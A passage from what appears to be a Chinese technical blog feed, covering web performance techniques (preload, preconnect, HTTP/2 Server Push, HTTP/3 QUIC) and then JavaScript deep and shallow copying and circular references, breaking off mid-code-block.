align="left">as</td><td align="left">资源类型（font&#x2F;script&#x2F;style）</td><td align="left">✔️</td></tr><tr><td align="left">type</td><td align="left">MIME类型（如font&#x2F;woff2）</td><td align="left">推荐</td></tr><tr><td align="left">crossorigin</td><td align="left">跨域资源必须</td><td align="left">条件</td></tr><tr><td align="left">fetchpriority</td><td align="left">优先级控制（high&#x2F;low）</td><td align="left">Chrome</td></tr></tbody></table><p>适用场景：</p><ul><li>首屏关键CSS：避免渲染阻塞</li><li>自定义字体：消除FOIT（字体未加载时的空白）</li><li>首屏图片：LCP（最大内容绘制）优化</li><li>核心框架JS：提前解析编译</li></ul><p><strong>预连接（preconnect）</strong></p><p>核心作用：提前完成跨域连接的握手阶段，节省DNS+TCP+TLS时间（约100-500ms）。</p><pre class="mermaid">sequenceDiagram    participant Browser    participant CDN as 第三方服务器    Browser->>Browser: 解析HTML发现preconnect    Browser->>CDN: 1. DNS解析    Browser->>CDN: 2. TCP握手    Browser->>CDN: 3. TLS协商    Note over Browser,CDN: 连接就绪（节省3次RTT）    Browser->>CDN: 实际资源请求（立即发送）</pre><p>实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 预连接第三方源 --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot;&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://api.example.com&quot; crossorigin&gt;<br><br>&lt;!-- DNS预取（更轻量） --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cdn.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p>关键属性：</p><table><thead><tr><th align="left">属性</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">href</td><td align="left">目标域名（无路径）</td></tr><tr><td align="left">crossorigin</td><td align="left">需凭证的资源必须设置</td></tr></tbody></table><p>适用场景：</p><ul><li>CDN资源域：静态资源加载</li><li>API接口域：AJAX请求优化</li><li>分析统计域：Google Analytics等</li><li>第三方组件：社交媒体插件</li></ul><p><strong>对比决策指南</strong></p><table><thead><tr><th align="left">特性</th><th align="left">preload</th><th align="left">preconnect</th></tr></thead><tbody><tr><td align="left">优化目标</td><td align="left">资源本身</td><td align="left">网络连接</td></tr><tr><td align="left">网络消耗</td><td align="left">高（传输资源内容）</td><td align="left">低（仅握手）</td></tr><tr><td align="left">执行时机</td><td align="left">立即下载资源</td><td align="left">建立连接池备用</td></tr><tr><td align="left">最佳适用</td><td align="left">已知URL的关键渲染资源</td><td align="left">未知URL的第三方域</td></tr><tr><td align="left">优先级</td><td align="left">非常高（强制加载）</td><td align="left">高</td></tr><tr><td align="left">浏览器支持</td><td align="left">Chrome&gt;58, Firefox&gt;56, Safari&gt;11</td><td align="left">Chrome&gt;46, Firefox&gt;39, Safari&gt;11</td></tr></tbody></table><h2 id="4-3-协议升级"><a href="#4-3-协议升级" class="headerlink" title="4.3 协议升级"></a>4.3 协议升级</h2><h3 id="HTTP-2服务端推送（Server-Push）"><a href="#HTTP-2服务端推送（Server-Push）" class="headerlink" title="HTTP&#x2F;2服务端推送（Server Push）"></a>HTTP&#x2F;2服务端推送（Server Push）</h3><p><strong>核心原理</strong></p><p>服务端在响应主资源请求时，主动推送关联子资源到浏览器缓存，消除传统”请求-响应”链的串行延迟。</p><pre class="mermaid">sequenceDiagram    participant Client as 客户端    participant Server as 服务器    Client->>Server: 请求HTML文档 (GET /index.html)    Server->>Server: 解析HTML依赖 (CSS/JS/图片)    Server->>Client: 响应HTML + PUSH_PROMISE帧 (承诺推送/css/style.css)    Server->>Client: 推送CSS文件 (DATA帧)    Server->>Client: 推送JS文件 (PUSH_PROMISE + DATA)    Client->>Client: 从缓存直接加载推送资源    Note over Client: 渲染无需等待后续请求</pre><p><strong>与传统加载对比</strong></p><table><thead><tr><th align="left">阶段</th><th align="left">HTTP&#x2F;1.1</th><th align="left">HTTP&#x2F;2 + Server Push</th></tr></thead><tbody><tr><td align="left">首次请求</td><td align="left">获取HTML</td><td align="left">获取HTML</td></tr><tr><td align="left">发现子资源</td><td align="left">解析HTML → 发起CSS&#x2F;JS请求</td><td align="left">无需请求（已推送至缓存）</td></tr><tr><td align="left">资源传输</td><td align="left">顺序等待（队头阻塞）</td><td align="left">并行传输</td></tr><tr><td align="left">渲染开始</td><td align="left">300-500ms</td><td align="left">0ms（CSS已就绪）</td></tr></tbody></table><p><strong>技术实现详解</strong></p><p>(1) 推送触发条件</p><ul><li>显式配置（开发者指定）</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx配置</span><br><span class="hljs-attribute">http2_push</span> /static/style.css;<br><span class="hljs-attribute">http2_push_preload</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment"># 解析Link头部</span><br></code></pre></td></tr></table></figure><ul><li>隐式触发（需启用<code>http2_push_preload</code>）</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"># 响应头声明需推送资源<br><span class="hljs-attribute">Link</span><span class="hljs-punctuation">: </span>&lt;/static/script.js&gt;; rel=preload; as=script<br></code></pre></td></tr></table></figure><p>(2) 推送协议流程</p><ul><li>发送 PUSH_PROMISE帧<ul><li>包含欲推送资源的请求头（:path&#x2F;:authority）</li><li>承诺的 流ID 为偶数（区分客户端请求的奇数流）</li></ul></li><li>推送 HEADERS+DATA帧<ul><li>在原始响应流完成前发送推送资源</li></ul></li><li>客户端 缓存管理<ul><li>浏览器验证缓存有效性（类似常规请求）</li></ul></li></ul><p>(3) 客户端控制机制</p><ul><li>接受推送：默认自动缓存（除非缓存头禁止）</li><li>拒绝推送：发送 RST_STREAM帧（场景：资源已缓存）</li></ul><pre class="mermaid">sequenceDiagram    Server->>Client: PUSH_PROMISE (流ID:2)    alt 客户端需要该资源        Client-->>Server: 无操作（接受推送）    else 资源已缓存        Client->>Server: RST_STREAM (流ID:2)    end</pre><p><strong>性能优化场景</strong></p><table><thead><tr><th align="left">场景</th><th align="left">传统方式问题</th><th align="left">Server Push解决方案</th></tr></thead><tbody><tr><td align="left">关键CSS阻塞渲染</td><td align="left">需往返请求 → 延迟渲染</td><td align="left">推送CSS → 实现”0-RTT渲染”</td></tr><tr><td align="left">字体加载空白(FOIT)</td><td align="left">文字延迟显示</td><td align="left">推送字体文件 → 消除布局偏移</td></tr><tr><td align="left">首屏图片(LCP)</td><td align="left">图片请求靠后 → LCP延迟</td><td align="left">推送英雄图 → 加速LCP</td></tr></tbody></table><p><strong>配置最佳实践：Node.js 实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> http2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http2&#x27;</span>);<br><span class="hljs-keyword">const</span> server = http2.<span class="hljs-title function_">createSecureServer</span>(&#123; cert, key &#125;);<br><br>server.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;stream&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">stream, headers</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (headers[<span class="hljs-string">&#x27;:path&#x27;</span>] === <span class="hljs-string">&#x27;/index.html&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 推送CSS</span><br>    stream.<span class="hljs-title function_">pushStream</span>(&#123; <span class="hljs-string">&#x27;:path&#x27;</span>: <span class="hljs-string">&#x27;/style.css&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">pushStream</span>) =&gt;</span> &#123;<br>      pushStream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;style.css&#x27;</span>, &#123;<br>        <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/css&#x27;</span><br>      &#125;);<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 响应HTML</span><br>    stream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, &#123;<br>      <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span><br>    &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>黄金法则</strong></p><ul><li>仅推送关键渲染资源<ul><li>首屏CSS</li><li>阻塞渲染JS</li><li>LCP图片</li></ul></li><li>体积控制<ul><li>单页推送资源≤30KB</li><li>总推送量≤100KB（避免队头阻塞）</li></ul></li><li>缓存感知<ul><li>结合 Cache-Digest 草案（暂未普及）</li><li>短TTL资源避免推送（如个性化内容）</li></ul></li></ul><p><strong>浏览器支持与限制</strong></p><table><thead><tr><th align="left">浏览器</th><th align="left">支持版本</th><th align="left">特殊限制</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">49+</td><td align="left">需HTTPS</td></tr><tr><td align="left">Firefox</td><td align="left">44+</td><td align="left">允许HTTP推送（非标准）</td></tr><tr><td align="left">Safari</td><td align="left">不支持</td><td align="left">技术路线转向103 Early Hints</td></tr><tr><td align="left">Edge</td><td align="left">12+</td><td align="left">同Chromium</td></tr></tbody></table><h3 id="HTTP-3的QUIC协议优势"><a href="#HTTP-3的QUIC协议优势" class="headerlink" title="HTTP&#x2F;3的QUIC协议优势"></a>HTTP&#x2F;3的QUIC协议优势</h3><p><strong>QUIC协议核心优势</strong></p><p>(1) 连接建立优化（0-1 RTT）</p><ul><li>首次连接：QUIC合并传输层与加密层握手 → 1-RTT完成连接+TLS协商（对比TCP+TLS的2-3 RTT）</li><li>会话恢复：支持0-RTT握手，客户端缓存密钥后可直接发送数据（如重复访问用户瞬间加载资源）</li></ul><pre class="mermaid">sequenceDiagram    客户端->>服务器: 首次请求 (1-RTT)    服务器->>客户端: 返回加密密钥（缓存）    客户端->>服务器: 后续请求 (0-RTT + 应用数据)</pre><p>(2) 彻底解决队头阻塞（HOL Blocking）</p><ul><li>HTTP&#x2F;2问题：基于TCP的多路复用中，单个包丢失会阻塞所有流</li><li>QUIC方案：在UDP上实现独立流控制，每个流单独处理丢包重传 → 包丢失仅影响当前流，其他流正常传输</li></ul><p>(3) 无缝连接迁移</p><ul><li>传统TCP问题：网络切换（如Wi-Fi→4G）导致连接中断 → 需重新握手</li><li>QUIC方案：通过Connection ID标识连接（非IP&#x2F;端口四元组） → 网络切换时连接保持活跃</li></ul><p>(4) 默认强加密与安全性</p><ul><li>强制TLS 1.3：所有QUIC流量默认加密，支持前向保密（PFS） → 即使密钥泄露，历史数据仍安全</li><li>抗重放攻击：通过单次密钥派生值验证，拒绝重复请求 </li><li>防协议降级：集成TLS 1.3的抗降级机制，阻止中间人强制低版本加密</li></ul><p>(5) 拥塞控制优化</p><ul><li>动态算法：内置BBR（Bottleneck Bandwidth and Round-trip）算法 → 高延迟网络中吞吐量提升30%+</li><li>用户态实现：协议栈位于应用层（非内核），可快速迭代拥塞算法</li></ul><p>(6) 头部压缩与传输效率</p><ul><li>QPACK压缩：改进HTTP&#x2F;2的HPACK，支持乱序编码 → 减少30%头部开销。</li><li>前向纠错（FEC）：添加冗余数据包，少量丢包时无需重传 → 弱网下视频卡顿率降低50%</li></ul><p><strong>QUIC vs TCP&#x2F;TLS 关键对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">TCP&#x2F;TLS（HTTP&#x2F;2）</th><th align="left">QUIC（HTTP&#x2F;3）</th><th align="left">前端影响</th></tr></thead><tbody><tr><td align="left">连接建立</td><td align="left">2-3 RTT</td><td align="left">0-1 RTT</td><td align="left">LCP时间↓34%</td></tr><tr><td align="left">多路复用</td><td align="left">流级阻塞</td><td align="left">包级独立</td><td align="left">FCP稳定性↑</td></tr><tr><td align="left">网络切换</td><td align="left">连接中断</td><td align="left">无缝迁移</td><td align="left">移动端跳出率↓</td></tr><tr><td align="left">加密机制可选TLS强制TLS 1.3混合内容风险消除</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">部署灵活性</td><td align="left">依赖操作系统内核</td><td align="left">用户态协议栈</td><td align="left">快速拥塞算法更新</td></tr></tbody></table><p><strong>前端性能优化实践</strong></p><ul><li>优先关键资源：<ul><li>HTTP&#x2F;3下无需过度域名分片（单连接多流独立），集中CDN域名提升缓存命中率。</li></ul></li><li>0-RTT会话利用：<ul><li>静态资源设置长缓存 (Cache-Control: immutable)，匹配0-RTT快速加载 4。</li></ul></li><li>监控协议升级：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 查看浏览器Network面板Protocol列</span><br>performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">&quot;resource&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (res.<span class="hljs-property">nextHopProtocol</span> === <span class="hljs-string">&quot;h3&quot;</span>) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;HTTP/3 used&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>降级兼容方案：<ul><li>服务器同时监听HTTP&#x2F;2与HTTP&#x2F;3，Alt-Svc头自动协商协议：</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Alt-Svc</span><span class="hljs-punctuation">: </span>h3=&quot;:443&quot;; ma=2592000; v=&quot;46,43&quot;<br></code></pre></td></tr></table></figure><h1 id="五、高级网络技术"><a href="#五、高级网络技术" class="headerlink" title="五、高级网络技术"></a>五、高级网络技术</h1><h2 id="5-1-API设计规范"><a href="#5-1-API设计规范" class="headerlink" title="5.1 API设计规范"></a>5.1 API设计规范</h2><h3 id="RESTful架构原则（资源化-状态转移）"><a href="#RESTful架构原则（资源化-状态转移）" class="headerlink" title="RESTful架构原则（资源化&#x2F;状态转移）"></a>RESTful架构原则（资源化&#x2F;状态转移）</h3><h3 id="GraphQL查询与REST对比"><a href="#GraphQL查询与REST对比" class="headerlink" title="GraphQL查询与REST对比"></a>GraphQL查询与REST对比</h3><h2 id="5-2-调试与监控"><a href="#5-2-调试与监控" class="headerlink" title="5.2 调试与监控"></a>5.2 调试与监控</h2><h3 id="浏览器Network面板分析（Waterfall-Timing）"><a href="#浏览器Network面板分析（Waterfall-Timing）" class="headerlink" title="浏览器Network面板分析（Waterfall&#x2F;Timing）"></a>浏览器Network面板分析（Waterfall&#x2F;Timing）</h3><h3 id="性能指标（TTFB-LCP-FCP）监控"><a href="#性能指标（TTFB-LCP-FCP）监控" class="headerlink" title="性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控"></a>性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控</h3><h2 id="5-3-新兴技术"><a href="#5-3-新兴技术" class="headerlink" title="5.3 新兴技术"></a>5.3 新兴技术</h2><h3 id="WebRTC基础（P2P通信-信令服务）"><a href="#WebRTC基础（P2P通信-信令服务）" class="headerlink" title="WebRTC基础（P2P通信&#x2F;信令服务）"></a>WebRTC基础（P2P通信&#x2F;信令服务）</h3><h3 id="WebTransport协议探索"><a href="#WebTransport协议探索" class="headerlink" title="WebTransport协议探索"></a>WebTransport协议探索</h3>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript 专题知识学习</title>
    <link href="/2025/06/19/JavaScript%20Study%20Notes/"/>
    <url>/2025/06/19/JavaScript%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="深拷贝与浅拷贝"><a href="#深拷贝与浅拷贝" class="headerlink" title="深拷贝与浅拷贝"></a>深拷贝与浅拷贝</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>浅拷贝（shallow copy）</strong></p><p>浅拷贝只复制对象的第一层属性，如果属性类型是基本类型，则复制其值，如果属性类型是引用类型，则复制其在内存中的地址（即引用），因此拷贝后的对象与原对象共享引用类型的属性</p><p><strong>深拷贝（deep copy）</strong></p><p>深拷贝会递归复制对象的所有层级，创建一个全新的对象，新对象与原对象不共享任何引用类型的属性</p><span id="more"></span><h2 id="浅拷贝的实现方式"><a href="#浅拷贝的实现方式" class="headerlink" title="浅拷贝的实现方式"></a>浅拷贝的实现方式</h2><p><strong>Object.assign()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> shallowCopy = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, obj);<br></code></pre></td></tr></table></figure><p><strong>展开运算符</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> shallowCopy = &#123; ...obj &#125;;<br></code></pre></td></tr></table></figure><p><strong>Array.prototype.slice()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]];<br><span class="hljs-keyword">const</span> shallowCopy = arr.<span class="hljs-title function_">slice</span>();<br></code></pre></td></tr></table></figure><p><strong>Array.prototype.concat()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]];<br><span class="hljs-keyword">const</span> shallowCopy = arr.<span class="hljs-title function_">concat</span>();<br></code></pre></td></tr></table></figure><h2 id="深拷贝的实现方式"><a href="#深拷贝的实现方式" class="headerlink" title="深拷贝的实现方式"></a>深拷贝的实现方式</h2><p><strong>JSON.parse(JSON.stringify())</strong></p><p>最简单但有限制的深拷贝方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br></code></pre></td></tr></table></figure><p>局限性：</p><ul><li>不能处理函数、Symbol、undefined，会被完全删除</li><li>不能处理循环引用</li><li>会丢失 Date 对象的类型（转为 ISO 格式字符串）</li><li>会丢失 RegExp 对象的类型（转为空对象）</li><li>会丢失 Map&#x2F;Set 等特殊对象（转为空对象）</li></ul><p>需要注意的是：</p><ul><li>null 是 Json 规范中的合法值，因此 Json.parse(Json.stringify())是可以正确处理 null 的</li><li>NaN 和 Infinity 会被转为 null，因为它们在 JavaScript 属于 Number 类型，Json 规范中没有 NaN 和 Infinity 这种值，序列化过程中会转为 null</li></ul><p><strong>递归实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) &#123;<br>  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 处理循环引用</span><br>  <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">has</span>(obj)) &#123;<br>    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);<br>  &#125;<br>  <br>  <span class="hljs-keyword">let</span> clone;<br>  <br>  <span class="hljs-comment">// 处理特殊对象类型</span><br>  <span class="hljs-keyword">switch</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Date]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj.<span class="hljs-title function_">getTime</span>());<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object RegExp]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Map]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(obj, <span class="hljs-function">(<span class="hljs-params">[key, val]</span>) =&gt;</span> [key, <span class="hljs-title function_">deepClone</span>(val, hash)]));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Set]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(obj, <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(val, hash)));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Array]&#x27;</span>:<br>      clone = obj.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(item, hash));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// 处理普通对象</span><br>      clone = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj));<br>      hash.<span class="hljs-title function_">set</span>(obj, clone);<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) &#123;<br>          clone[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);<br>        &#125;<br>      &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第三方工具库</strong></p><ul><li>Lodash 的 <code>_.cloneDeep()</code></li><li>jQuery 的 <code>$.extend(true, &#123;&#125;, obj)</code></li></ul><h2 id="性能考虑"><a href="#性能考虑" class="headerlink" title="性能考虑"></a>性能考虑</h2><p>深拷贝比浅拷贝更消耗性能，特别是在处理大型对象或深层嵌套结构时，实际应用中应结合需求选择合适的拷贝方式</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p><strong>适合浅拷贝的场景</strong></p><ul><li>明确知道只需要拷贝第一层属性</li><li>需要快速拷贝而不关心嵌套对象的引用关系</li><li>对象属性都是基本类型</li></ul><p><strong>适合深拷贝的场景</strong></p><ul><li>需要完全独立的对象副本</li><li>需要修改嵌套对象但又不能影响原对象</li><li>处理不可变数据（如 Redux 的 state 更新）</li></ul><h2 id="面试常见问题"><a href="#面试常见问题" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：如何判断一个拷贝是深拷贝还是浅拷贝？</strong></p><p>可以通过修改拷贝对象的某个引用类型属性，查看原对象的属性是否被影响来判断</p><p><strong>Q：如何实现一个支持循环引用的深拷贝？</strong></p><p>使用 WeakMap 来存储已拷贝的对象，遇到相同的引用时直接返回存储的值</p><p><strong>Q：为什么Json.parse(Json.stringify())不能处理函数？</strong></p><p>因为 Json 格式不支持函数，在序列化过程中函数会被忽略</p><p><strong>Q：深拷贝和浅拷贝在性能上有什么区别？</strong></p><p>深拷贝需要递归遍历所有属性，性能开销大，特别是对于大型对象或深层嵌套结构</p><p><strong>Q：如何实现一个支持特殊对象（如 Date、RegExp）的深拷贝？</strong></p><p>需要在拷贝时判断对象类型，根据不同类型做特殊处理</p><h1 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h1><h2 id="循环引用的定义"><a href="#循环引用的定义" class="headerlink" title="循环引用的定义"></a>循环引用的定义</h2><p>循环引用是指对象之间相互引用，形成闭环的情况，简单来说就是对象 A 引用了对象 B，对象 B 又直接或间接的引用了对象 A</p><h2 id="循环引用的示例"><a href="#循环引用的示例" class="headerlink" title="循环引用的示例"></a>循环引用的示例</h2><p><strong>简单循环引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> objA = &#123;&#125;;<br><span class="hljs-keyword">const</span> objB = &#123; <span class="hljs-attr">a</span>: objA &#125;;<br>objA.<span class="hljs-property">b</span> = objB; <span class="hljs-comment">// 形成循环引用</span><br></code></pre></td></tr></table></figure><p><strong>自引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj; <span class="hljs-comment">// 对象引用自身</span><br></code></pre></td></tr></table></figure><p><strong>复杂循环引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Parent&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> child = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Child&quot;</span>, <span class="hljs-attr">parent</span>: parent &#125;;<br>parent.<span class="hljs-property">child</span> = child; <span class="hljs-comment">// 形成循环引用</span><br></code></pre></td></tr></table></figure><h2 id="循环引用带来的问题"><a href="#循环引用带来的问题" class="headerlink" title="循环引用带来的问题"></a>循环引用带来的问题</h2><p><strong>Json 序列化问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj); <span class="hljs-comment">// 抛出错误: TypeError: Converting circular structure to JSON</span><br></code></pre></td></tr></table></figure><p><strong>深拷贝问题</strong></p><p>普通的深拷贝方法（如递归拷贝）如果没有特殊处理循环引用，会导致无限递归</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 